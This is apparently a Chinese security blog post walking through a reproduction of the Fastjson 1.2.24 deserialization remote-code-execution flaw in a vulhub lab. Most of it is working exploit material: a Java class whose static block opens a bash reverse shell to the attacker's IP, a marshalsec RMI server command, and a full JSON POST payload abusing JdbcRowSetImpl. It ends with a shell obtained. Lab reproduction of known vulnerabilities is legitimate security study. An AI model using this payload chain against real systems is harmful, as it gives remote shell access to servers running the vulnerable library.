#  Fastjson 1.2.24 RCE复现   
原创 Pikaciu  Piusec   2024-09-15 16:38  
  
# 免责声明  
>   
> 本文仅用于技术讨论与学习，利用此文所提供的信息或工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任!  
  
## 漏洞复现  
  
这个fastjson1.2.24 rce漏洞是通过 vulhub   
靶场搭建的，我通过vulhub以及网上各种文章的exp复现总是失败，找了很多文章后成功复现，希望这篇文章能给正在复现fastjson 1.2.24漏洞的师傅们有所帮助  
```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;
 
public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.239.128/2333 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}

```  
  
准备已经被编译好的marshalsec-0.0.3-SNAPSHOT-all.jar github地址  
  
创建TouchFile.java文件把上面给的exp ip地址更改为你需要反弹的地址也就是你的攻击机，之后使用javac进行编译  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cYTGgX1JI0WoRLVnxaTwSOK6uc3kUtpSIoD425OVjjiaSO6U7stWSpFjsrAkyWvM1j6oursMV7kSzTmCOiav3s6w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cYTGgX1JI0WoRLVnxaTwSOK6uc3kUtpSibAicu1qIXszovK9qKJzsQ6w2mk7qAbed84LP3dSBe2jvMhNqbbaIia8w/640?wx_fmt=png&from=appmsg "")  
  
编译后的文件为  
TouchFile.class，在这个文件的目录使用python开启http服务  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cYTGgX1JI0WoRLVnxaTwSOK6uc3kUtpSOoOgbIe81Wfr0picEFRP0Vb2WXKOyAYHx2c48HxgKdbcsxrbibJWt34w/640?wx_fmt=png&from=appmsg "")  
  
使用java开启rmi服务，建议使用java8，kali多个java版本切换文章：  
  
Kali安装JAVA8和切换JDK版本的详细过程_kali安装jdk8-CSDN博客  
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.46.129:6867/#TouchFile 2786
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cYTGgX1JI0WoRLVnxaTwSOK6uc3kUtpSa2YLFLy2bBOxzDiaOWedsBBDb4ScN3ECI6efaA7S1wUNJoz5ZNptLiaw/640?wx_fmt=png&from=appmsg "")  
  
使用burp抓包把请求格式更改为POST提交，把数据格式更改为application/json  
```
POST / HTTP/1.1
Host: 192.168.46.131:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 161

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.46.129:2786/TouchFile",
        "autoCommit":true
    }
}

```  
  
攻击上面开启监听  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cYTGgX1JI0WoRLVnxaTwSOK6uc3kUtpSN07v9wtKV0TCXrQp4WbsZGwpNjPBhbGs0nwqGnnD6h6O9cKTicDSyyw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cYTGgX1JI0WoRLVnxaTwSOK6uc3kUtpSrCtoUtX2YD86icbibYHlVfhHDFEwZIZOFQsJEWoiaKLoZFdTAXNV5UjAA/640?wx_fmt=png&from=appmsg "")  
  
发包后成功的开到攻击机上监听到shell  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cYTGgX1JI0WoRLVnxaTwSOK6uc3kUtpSWGJEqImk0teeYeuexbFFWhGYusiacfkWKCn5UKfvw5EibeedSvl0FKdw/640?wx_fmt=png&from=appmsg "")  
  
  
  
